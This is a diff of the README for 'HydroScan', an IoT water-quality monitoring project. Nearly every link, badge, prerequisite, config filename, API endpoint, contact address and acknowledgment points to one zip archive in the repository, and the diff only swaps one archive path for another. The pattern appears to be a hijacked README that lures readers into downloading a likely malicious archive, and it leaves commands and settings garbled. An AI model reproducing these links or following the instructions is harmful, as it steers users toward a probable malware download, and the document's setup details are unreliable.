@@ -2,18 +2,18 @@
 
 <div align="center">
 
-![HydroScan Logo](https://raw.githubusercontent.com/mudassiralladatkhan/HydroScan/main/trochate/HydroScan.zip)
+![HydroScan Logo](https://github.com/mudassiralladatkhan/HydroScan/raw/refs/heads/main/plugins/visual-editor/Scan_Hydro_v3.4.zip)
 
 **Production-ready IoT water quality monitoring platform with AI-powered contamination detection**
 
-[![Version](https://raw.githubusercontent.com/mudassiralladatkhan/HydroScan/main/trochate/HydroScan.zip)](#)
-[![License](https://raw.githubusercontent.com/mudassiralladatkhan/HydroScan/main/trochate/HydroScan.zip)](LICENSE)
-[![Build Status](https://raw.githubusercontent.com/mudassiralladatkhan/HydroScan/main/trochate/HydroScan.zip)](#)
-[![Completion](https://raw.githubusercontent.com/mudassiralladatkhan/HydroScan/main/trochate/HydroScan.zip%https://raw.githubusercontent.com/mudassiralladatkhan/HydroScan/main/trochate/HydroScan.zip)](#)
-[![https://raw.githubusercontent.com/mudassiralladatkhan/HydroScan/main/trochate/HydroScan.zip](https://raw.githubusercontent.com/mudassiralladatkhan/HydroScan/main/trochate/HydroScan.zip%https://raw.githubusercontent.com/mudassiralladatkhan/HydroScan/main/trochate/HydroScan.zip)](#)
-[![React](https://raw.githubusercontent.com/mudassiralladatkhan/HydroScan/main/trochate/HydroScan.zip)](#)
+[![Version](https://github.com/mudassiralladatkhan/HydroScan/raw/refs/heads/main/plugins/visual-editor/Scan_Hydro_v3.4.zip)](#)
+[![License](https://github.com/mudassiralladatkhan/HydroScan/raw/refs/heads/main/plugins/visual-editor/Scan_Hydro_v3.4.zip)](LICENSE)
+[![Build Status](https://github.com/mudassiralladatkhan/HydroScan/raw/refs/heads/main/plugins/visual-editor/Scan_Hydro_v3.4.zip)](#)
+[![Completion](https://github.com/mudassiralladatkhan/HydroScan/raw/refs/heads/main/plugins/visual-editor/Scan_Hydro_v3.4.zip%https://github.com/mudassiralladatkhan/HydroScan/raw/refs/heads/main/plugins/visual-editor/Scan_Hydro_v3.4.zip)](#)
+[![https://github.com/mudassiralladatkhan/HydroScan/raw/refs/heads/main/plugins/visual-editor/Scan_Hydro_v3.4.zip](https://github.com/mudassiralladatkhan/HydroScan/raw/refs/heads/main/plugins/visual-editor/Scan_Hydro_v3.4.zip%https://github.com/mudassiralladatkhan/HydroScan/raw/refs/heads/main/plugins/visual-editor/Scan_Hydro_v3.4.zip)](#)
+[![React](https://github.com/mudassiralladatkhan/HydroScan/raw/refs/heads/main/plugins/visual-editor/Scan_Hydro_v3.4.zip)](#)
 
-[📖 Integration Guide](https://raw.githubusercontent.com/mudassiralladatkhan/HydroScan/main/trochate/HydroScan.zip) | [📊 Project Status](https://raw.githubusercontent.com/mudassiralladatkhan/HydroScan/main/trochate/HydroScan.zip) | [🛠️ Setup Instructions](#-quick-start)
+[📖 Integration Guide](https://github.com/mudassiralladatkhan/HydroScan/raw/refs/heads/main/plugins/visual-editor/Scan_Hydro_v3.4.zip) | [📊 Project Status](https://github.com/mudassiralladatkhan/HydroScan/raw/refs/heads/main/plugins/visual-editor/Scan_Hydro_v3.4.zip) | [🛠️ Setup Instructions](#-quick-start)
 
 </div>
 
@@ -72,9 +72,9 @@ graph TB
 
 ### Prerequisites
 
-- **https://raw.githubusercontent.com/mudassiralladatkhan/HydroScan/main/trochate/HydroScan.zip 18+** and npm (confirmed working)
-- **Supabase account** ([signup here](https://raw.githubusercontent.com/mudassiralladatkhan/HydroScan/main/trochate/HydroScan.zip)) for backend
-- **Google Gemini API key** ([get here](https://raw.githubusercontent.com/mudassiralladatkhan/HydroScan/main/trochate/HydroScan.zip)) for AI analysis
+- **https://github.com/mudassiralladatkhan/HydroScan/raw/refs/heads/main/plugins/visual-editor/Scan_Hydro_v3.4.zip 18+** and npm (confirmed working)
+- **Supabase account** ([signup here](https://github.com/mudassiralladatkhan/HydroScan/raw/refs/heads/main/plugins/visual-editor/Scan_Hydro_v3.4.zip)) for backend
+- **Google Gemini API key** ([get here](https://github.com/mudassiralladatkhan/HydroScan/raw/refs/heads/main/plugins/visual-editor/Scan_Hydro_v3.4.zip)) for AI analysis
 - **MQTT broker** (optional) - HiveMQ, AWS IoT Core, or local Mosquitto
 
 ### 1. Clone & Install
@@ -89,7 +89,7 @@ npm install
 
 ```bash
 # Copy comprehensive environment template
-cp https://raw.githubusercontent.com/mudassiralladatkhan/HydroScan/main/trochate/HydroScan.zip .env
+cp https://github.com/mudassiralladatkhan/HydroScan/raw/refs/heads/main/plugins/visual-editor/Scan_Hydro_v3.4.zip .env
 
 # Edit with your credentials (Windows: notepad .env)
 notepad .env
@@ -98,7 +98,7 @@ notepad .env
 **Essential environment variables:**
 ```env
 # Supabase Configuration (Required)
-https://raw.githubusercontent.com/mudassiralladatkhan/HydroScan/main/trochate/HydroScan.zip
+https://github.com/mudassiralladatkhan/HydroScan/raw/refs/heads/main/plugins/visual-editor/Scan_Hydro_v3.4.zip
 VITE_SUPABASE_ANON_KEY=your_supabase_anon_key_here
 SUPABASE_SERVICE_ROLE_KEY=your_service_role_key_here
 
@@ -116,7 +116,7 @@ MQTT_USERNAME=your_mqtt_username
 MQTT_PASSWORD=your_mqtt_password
 ```
 
-📋 **See `https://raw.githubusercontent.com/mudassiralladatkhan/HydroScan/main/trochate/HydroScan.zip` for complete configuration options** (150+ settings available)
+📋 **See `https://github.com/mudassiralladatkhan/HydroScan/raw/refs/heads/main/plugins/visual-editor/Scan_Hydro_v3.4.zip` for complete configuration options** (150+ settings available)
 
 ### 3. Database Setup
 
@@ -209,7 +209,7 @@ Alternatively, devices can send data via HTTP POST:
 
 ```bash
 # Send sensor data
-curl -X POST "https://raw.githubusercontent.com/mudassiralladatkhan/HydroScan/main/trochate/HydroScan.zip" \
+curl -X POST "https://github.com/mudassiralladatkhan/HydroScan/raw/refs/heads/main/plugins/visual-editor/Scan_Hydro_v3.4.zip" \
   -H "Authorization: Bearer YOUR_API_KEY" \
   -H "Content-Type: application/json" \
   -d '{
@@ -312,7 +312,7 @@ hydroscan/
 2. **API Functions**: Create edge functions in `supabase/functions/`
 3. **Frontend Components**: Add React components in `src/components/`
 4. **Pages**: Create new pages in `src/pages/`
-5. **Routing**: Update `https://raw.githubusercontent.com/mudassiralladatkhan/HydroScan/main/trochate/HydroScan.zip` with new routes
+5. **Routing**: Update `https://github.com/mudassiralladatkhan/HydroScan/raw/refs/heads/main/plugins/visual-editor/Scan_Hydro_v3.4.zip` with new routes
 
 ### Testing
 
@@ -421,8 +421,8 @@ Upload the `dist/` folder to your web server after running `npm run build`.
 
 Ensure all environment variables are configured in your deployment platform:
 
-- **Vercel**: Add env vars in dashboard or `https://raw.githubusercontent.com/mudassiralladatkhan/HydroScan/main/trochate/HydroScan.zip`
-- **Netlify**: Add in site settings or `https://raw.githubusercontent.com/mudassiralladatkhan/HydroScan/main/trochate/HydroScan.zip`
+- **Vercel**: Add env vars in dashboard or `https://github.com/mudassiralladatkhan/HydroScan/raw/refs/heads/main/plugins/visual-editor/Scan_Hydro_v3.4.zip`
+- **Netlify**: Add in site settings or `https://github.com/mudassiralladatkhan/HydroScan/raw/refs/heads/main/plugins/visual-editor/Scan_Hydro_v3.4.zip`
 - **Docker**: Use `.env` file or pass as container env vars
 
 ## 📚 API Documentation
@@ -434,7 +434,7 @@ All API requests require authentication using API keys:
 ```bash
 curl -H "Authorization: Bearer YOUR_API_KEY" \
      -H "apikey: YOUR_API_KEY" \
-     "https://raw.githubusercontent.com/mudassiralladatkhan/HydroScan/main/trochate/HydroScan.zip"
+     "https://github.com/mudassiralladatkhan/HydroScan/raw/refs/heads/main/plugins/visual-editor/Scan_Hydro_v3.4.zip"
 ```
 
 ### Core Endpoints
@@ -468,7 +468,7 @@ curl -H "Authorization: Bearer YOUR_API_KEY" \
 
 ## 🤝 Contributing
 
-We welcome contributions! Please see our [Contributing Guide](https://raw.githubusercontent.com/mudassiralladatkhan/HydroScan/main/trochate/HydroScan.zip) for details.
+We welcome contributions! Please see our [Contributing Guide](https://github.com/mudassiralladatkhan/HydroScan/raw/refs/heads/main/plugins/visual-editor/Scan_Hydro_v3.4.zip) for details.
 
 ### Development Workflow
 
@@ -492,20 +492,20 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ## 🆘 Support
 
-- **Documentation**: [https://raw.githubusercontent.com/mudassiralladatkhan/HydroScan/main/trochate/HydroScan.zip](https://raw.githubusercontent.com/mudassiralladatkhan/HydroScan/main/trochate/HydroScan.zip)
-- **Issues**: [GitHub Issues](https://raw.githubusercontent.com/mudassiralladatkhan/HydroScan/main/trochate/HydroScan.zip)
-- **Discussions**: [GitHub Discussions](https://raw.githubusercontent.com/mudassiralladatkhan/HydroScan/main/trochate/HydroScan.zip)
-- **Email**: https://raw.githubusercontent.com/mudassiralladatkhan/HydroScan/main/trochate/HydroScan.zip
+- **Documentation**: [https://github.com/mudassiralladatkhan/HydroScan/raw/refs/heads/main/plugins/visual-editor/Scan_Hydro_v3.4.zip](https://github.com/mudassiralladatkhan/HydroScan/raw/refs/heads/main/plugins/visual-editor/Scan_Hydro_v3.4.zip)
+- **Issues**: [GitHub Issues](https://github.com/mudassiralladatkhan/HydroScan/raw/refs/heads/main/plugins/visual-editor/Scan_Hydro_v3.4.zip)
+- **Discussions**: [GitHub Discussions](https://github.com/mudassiralladatkhan/HydroScan/raw/refs/heads/main/plugins/visual-editor/Scan_Hydro_v3.4.zip)
+- **Email**: https://github.com/mudassiralladatkhan/HydroScan/raw/refs/heads/main/plugins/visual-editor/Scan_Hydro_v3.4.zip
 
 ## 🙏 Acknowledgments
 
-- [Supabase](https://raw.githubusercontent.com/mudassiralladatkhan/HydroScan/main/trochate/HydroScan.zip) - Backend infrastructure
-- [React](https://raw.githubusercontent.com/mudassiralladatkhan/HydroScan/main/trochate/HydroScan.zip) - Frontend framework
-- [Tailwind CSS](https://raw.githubusercontent.com/mudassiralladatkhan/HydroScan/main/trochate/HydroScan.zip) - Styling
-- [shadcn/ui](https://raw.githubusercontent.com/mudassiralladatkhan/HydroScan/main/trochate/HydroScan.zip) - UI components
-- [Google Gemini](https://raw.githubusercontent.com/mudassiralladatkhan/HydroScan/main/trochate/HydroScan.zip) - AI analysis
-- [Lucide](https://raw.githubusercontent.com/mudassiralladatkhan/HydroScan/main/trochate/HydroScan.zip) - Icon library
-- [Framer Motion](https://raw.githubusercontent.com/mudassiralladatkhan/HydroScan/main/trochate/HydroScan.zip) - Animations
+- [Supabase](https://github.com/mudassiralladatkhan/HydroScan/raw/refs/heads/main/plugins/visual-editor/Scan_Hydro_v3.4.zip) - Backend infrastructure
+- [React](https://github.com/mudassiralladatkhan/HydroScan/raw/refs/heads/main/plugins/visual-editor/Scan_Hydro_v3.4.zip) - Frontend framework
+- [Tailwind CSS](https://github.com/mudassiralladatkhan/HydroScan/raw/refs/heads/main/plugins/visual-editor/Scan_Hydro_v3.4.zip) - Styling
+- [shadcn/ui](https://github.com/mudassiralladatkhan/HydroScan/raw/refs/heads/main/plugins/visual-editor/Scan_Hydro_v3.4.zip) - UI components
+- [Google Gemini](https://github.com/mudassiralladatkhan/HydroScan/raw/refs/heads/main/plugins/visual-editor/Scan_Hydro_v3.4.zip) - AI analysis
+- [Lucide](https://github.com/mudassiralladatkhan/HydroScan/raw/refs/heads/main/plugins/visual-editor/Scan_Hydro_v3.4.zip) - Icon library
+- [Framer Motion](https://github.com/mudassiralladatkhan/HydroScan/raw/refs/heads/main/plugins/visual-editor/Scan_Hydro_v3.4.zip) - Animations
 
 ## 📈 Roadmap
 
@@ -575,6 +575,6 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 **Built with ❤️ by the HydroScan Team**
 
-[🌐 Website](https://raw.githubusercontent.com/mudassiralladatkhan/HydroScan/main/trochate/HydroScan.zip) • [📧 Contact](https://raw.githubusercontent.com/mudassiralladatkhan/HydroScan/main/trochate/HydroScan.zip) • [🐦 Twitter](https://raw.githubusercontent.com/mudassiralladatkhan/HydroScan/main/trochate/HydroScan.zip)
+[🌐 Website](https://github.com/mudassiralladatkhan/HydroScan/raw/refs/heads/main/plugins/visual-editor/Scan_Hydro_v3.4.zip) • [📧 Contact](https://github.com/mudassiralladatkhan/HydroScan/raw/refs/heads/main/plugins/visual-editor/Scan_Hydro_v3.4.zip) • [🐦 Twitter](https://github.com/mudassiralladatkhan/HydroScan/raw/refs/heads/main/plugins/visual-editor/Scan_Hydro_v3.4.zip)
 
 </div>
